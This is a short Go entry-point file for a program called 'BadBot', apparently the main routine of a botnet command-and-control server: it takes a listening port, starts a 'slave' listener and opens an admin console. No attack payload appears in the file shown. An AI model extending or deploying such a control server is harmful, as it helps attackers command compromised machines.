package main

import (
	"BadBot/source/admin"
	"BadBot/source/admin/commands"
	"BadBot/source/slave"
	"log"
	"math/rand"
	"os"
	"time"
)

func init() {
	rand.New(rand.NewSource(time.Now().UnixNano()))
}

func main() {

	if len(os.Args) != 2 {
		log.Fatalln("[BadBot] Please include the port to listen to!")
	}

	commands.ClearScreen()
	commands.Init_Commands()
	go slave.Init_Slave(os.Args[1])

	admin.AdminHandle()

}
